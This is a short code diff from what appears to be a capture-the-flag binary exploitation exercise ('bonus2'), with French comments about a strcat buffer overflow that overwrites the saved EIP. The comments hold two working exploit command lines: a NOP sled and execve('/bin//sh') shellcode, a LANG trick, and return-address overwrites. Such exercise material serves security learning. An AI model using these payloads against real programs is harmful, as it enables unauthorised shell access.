@@ -42,7 +42,7 @@ void greetuser(buf)
 //Je controle les 2 derniers bytes(4242), mais pas les autres et 0800 correspond a une adresse sur la heap et je ne controle rien dessus !
 	}
 	strcat(0xbffff260, av[2]);//av[2]+18 == 0xbffff2ac (save eip)
-//export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") && export LANG="fi" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')
+// export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") && export LANG="fi" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')
 
 //export LANG="fi" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xff\xf4\xff\xbf"')
 
